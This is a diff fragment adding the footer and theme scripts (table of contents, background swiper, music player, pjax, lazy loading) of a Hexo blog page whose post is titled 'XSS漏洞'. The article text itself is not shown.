+      <div class="post-tags-categories">
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>txjg</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2021/12/17/xss漏洞/" target="_blank" title="XSS漏洞">https://ntexjg.github.io/2021/12/17/xss漏洞/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+    
+
+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>本文目录</span>
+        
+          <div class="toc-open-close">本文目录</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
+  
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '#ffffff';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2019 - 2022</p>
+
+          </div>
+        
+      
+        
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="netease"
+  type="playlist"
+  id="489221140"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <!-- 背景彩带 -->
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script>
+
+<script>
+  var headerEl = 'h2, h3, h4, h5, h6',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -80,
+    headingsOffset: -($(window).height() * 0.4 - 45),
+    positionFixedSelector: '.toc-main',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 100) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('toc-aside')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  }
+</style> 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const headerMenuTransparent = true;
+    if (!headerMenuTransparent) { return; }
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.css">
+  <script src="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+   
+    <script src="/js/cursor/clicklove.js"></script> 
+  
+
+
+
+
+
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
